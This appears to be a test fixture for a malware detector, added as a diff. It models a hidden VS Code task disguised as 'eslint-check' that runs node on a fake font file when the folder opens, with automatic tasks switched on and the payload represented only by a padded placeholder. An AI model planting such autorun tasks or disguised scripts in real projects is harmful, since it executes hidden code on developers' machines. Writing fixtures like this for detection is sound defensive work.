@@ -1,0 +1,20 @@
+# PolinRider: a hidden folder-open task runs node on a fake font
+want: disguised-script editor-autorun-enabled editor-task-command suspicious-command
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "node public/fonts/fa-solid-400.woff2",
+      "hide": true,
+      "presentation": {"reveal": "never", "echo": false},
+      "runOptions": {"runOn": "folderOpen"},
+    },
+  ],
+}
+-- .vscode/settings.json --
+{ "task.allowAutomaticTasks": "on" }
+-- public/fonts/fa-solid-400.woff2 --
+{% repeat "\t" 273 %}{% loader %}
